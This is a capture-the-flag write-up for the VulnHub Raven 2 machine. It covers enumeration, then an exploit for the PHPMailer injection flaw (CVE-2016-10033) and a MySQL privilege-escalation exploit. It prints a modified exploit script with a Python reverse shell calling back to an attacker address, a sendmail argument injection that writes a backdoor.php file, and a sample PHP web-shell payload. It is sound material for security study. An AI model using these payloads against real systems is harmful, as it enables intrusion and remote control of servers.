## Raven

https://www.vulnhub.com/entry/raven-2,269/

### www-data
Open 192.168.1.148:22
Open 192.168.1.148:80
Open 192.168.1.148:111
Open 192.168.1.148:34297

```
/img                  (Status: 301) [Size: 312] [--> http://192.168.1.148/img/]
/index.html           (Status: 200) [Size: 16819]
/contact.php          (Status: 200) [Size: 9699]
/about.html           (Status: 200) [Size: 13265]
/service.html         (Status: 200) [Size: 11114]
/css                  (Status: 301) [Size: 312] [--> http://192.168.1.148/css/]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.1.148/wordpress/]
/team.html            (Status: 200) [Size: 15449]
/manual               (Status: 301) [Size: 315] [--> http://192.168.1.148/manual/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.1.148/js/]
/vendor               (Status: 301) [Size: 315] [--> http://192.168.1.148/vendor/]
/elements.html        (Status: 200) [Size: 35226]
/fonts                (Status: 301) [Size: 314] [--> http://192.168.1.148/fonts/]
```

Flag 1 is inside `http://192.168.1.148/vendor/PATH`.

Path is /var/www/html/vendor/.

Flag 3 is inside `http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png`.

PHP Mailer 5.2.16 being used.

There is a [exploit](https://www.exploit-db.com/exploits/40974) to RCE for PHP Mailer under 5.2.18.

When we send contact, the application will POST to `mail.php`. Change to `/contact.php`.

We have to make some modification to the exploit works.
```python
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

target = 'http://192.168.1.149'
backdoor = '/backdoor.php'

urlPOST = target + '/contact.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.1.125\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'subject':'anything',
        'email': '"exploiting\\\" -oQ/tmp/ -X/var/www/html/backdoor.php server"@protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(urlPOST, data=m.to_string(),
                  headers=headers, proxies=proxies)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers, proxies=proxies)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
            
```

Flag2 is inside `/var/www/`.

<br>

### Privilege Escalation
On wp-config.php:
```
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');
```

Enumerating with LinPeas we find this version of mysql: mysql Ver 14.14 Distrib 5.5.60 (x86_64).

Searching for this, we get this [exploit](https://www.exploit-db.com/exploits/46249).
```
python2 dbExploit.py --username root --password 'R@v3nSecurity'
```

<br>

### PHP Mailer RCE Study Case
The function `mailSend` is vulnerable. When the Sender is not set, attackers can pass extra parameter to the mail command and execute arbitrary code.

Emulating environment:
```bash
docker run --rm -it -p 8080:80 vulnerables/cve-2016-10033
```

There is no filter in `mailSend()` [function](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L1445).
```php
$params = null;
//This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
if (!empty($this->Sender)) {
	$params = sprintf('-f%s', $this->Sender);
}
```

Then, the code flow goes to `mailPassthru()` function, which, if running in `safe_mode` won't be vulnerable to this flaw, as the following code states it.
```php
//Can't use additional_parameters in safe_mode
//@link http://php.net/manual/en/function.mail.php
if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
	$result = @mail($to, $subject, $body, $header);
} else {
	$result = @mail($to, $subject, $body, $header, $params);
}
```

Below is the `mail()` function.
```php
bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )
```

There are several exploitation methods for different results, we will focus on the exploitation of the **5th parameter** to get Remote Code Execution (RCE). The parameter `$additional_parameters` is used to pass additional flags as command line options to the program configured to send the email.

An example of a vulnerable PHP code:

```php
$to = 'hacker@server.com';
$subject = '<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>';
$message = 'Pwned';
$headers = '';
$options = '-OQueueDirectory=/tmp -X/www/backdoor.php';
mail($to, $subject, $message, $headers, $options);
```
